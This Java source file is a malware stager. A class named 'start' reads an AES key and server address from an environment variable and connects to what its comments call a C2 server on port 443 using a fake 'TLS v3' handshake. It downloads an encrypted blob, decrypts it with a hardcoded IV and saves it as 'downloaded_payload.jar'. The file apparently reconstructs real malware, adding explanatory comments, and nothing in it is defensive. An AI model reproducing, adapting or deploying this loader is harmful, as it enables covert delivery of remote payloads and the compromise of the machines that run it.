import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.util.Base64;
import javax.crypto.Cipher;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.SecretKeySpec;

public class start {
    public static void main(String[] args) {
        byte[] arrayOfByte1 = { 
            -51, 74, 84, -79, -108, -28, -118, 102, -47, -30, 
            93, -91, -111, 9, -48, 65 }; // Hardcoded IV
        byte[] aesKey = new byte[16]; // AES decryption key
        byte[] arrayOfByte4 = new byte[67584]; // Buffer for downloaded data
        byte[] decryptedPayload = null; // Placeholder for the decrypted payload

        try {
            // Retrieve environment variables
            Base64.Decoder decoder = Base64.getDecoder();
            String queryEnv = System.getenv("query").replace('-', '+').replace('_', '/');
            byte[] decodedQuery = decoder.decode(queryEnv);

            // Extract AES key and server info from the query
            System.arraycopy(decodedQuery, 0, aesKey, 0, 16);
            String[] serverInfo = new String(decodedQuery, 48, decodedQuery.length - 48).split(";");

            // Connect to the C2 server
            String serverAddress = serverInfo[0];
            Socket socket = new Socket(serverAddress, 443);
            InputStream inputStream = socket.getInputStream();
            OutputStream outputStream = socket.getOutputStream();

            // Send the handshake message
            Base64.Encoder encoder = Base64.getEncoder().withoutPadding();
            byte[] sessionKey = new byte[32];
            System.arraycopy(decodedQuery, 16, sessionKey, 0, 32);
            outputStream.write(("TLS v3 " + encoder.encodeToString(sessionKey)).getBytes());

            // Read encrypted data from the server
            int bytesRead, totalBytesRead = 0;
            while ((bytesRead = inputStream.read(arrayOfByte4, totalBytesRead, arrayOfByte4.length - totalBytesRead)) > 0) {
                totalBytesRead += bytesRead;
            }

            // Decrypt the payload
            SecretKeySpec secretKeySpec = new SecretKeySpec(aesKey, "AES");
            IvParameterSpec ivParameterSpec = new IvParameterSpec(arrayOfByte1);
            Cipher cipher = Cipher.getInstance("AES/CBC/NoPadding");
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec, ivParameterSpec);

            byte[] decryptedData = cipher.doFinal(arrayOfByte4, 0, totalBytesRead & 0xFFF0);
            int payloadLength = (decryptedData[0] & 0xFF) + (decryptedData[1] & 0xFF) * 256;
            if (payloadLength <= totalBytesRead - 2) {
                decryptedPayload = new byte[payloadLength];
                System.arraycopy(decryptedData, 2, decryptedPayload, 0, payloadLength);
            }

            // Write the decrypted payload to a file
            String outputFile = "downloaded_payload.jar";
            try (FileOutputStream fileOutputStream = new FileOutputStream(outputFile)) {
                fileOutputStream.write(decryptedPayload);
                System.out.println("Payload downloaded and saved to: " + outputFile);
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
